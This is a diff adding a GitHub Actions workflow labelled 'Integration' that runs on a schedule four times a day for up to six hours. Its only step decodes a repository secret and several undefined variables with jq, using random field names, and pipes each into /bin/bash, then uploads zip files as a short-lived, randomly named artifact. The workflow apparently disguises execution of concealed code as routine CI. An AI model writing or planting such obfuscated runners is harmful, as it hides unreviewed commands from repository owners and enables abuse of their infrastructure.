@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          h2: ${{ secrets.h2 }}
+        run: |
+          printf '%s' "$h2" | jq -r .xodty994 | /bin/bash
+          printf '%s' "$i0" | jq -r .e5 | /bin/bash
+          echo $dhghj22464 | jq -r .btu94 | /bin/bash
+          echo $azv104 | jq -r .m99 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hQGGT47D
+          path: "*.zip"
+          retention-days: 1
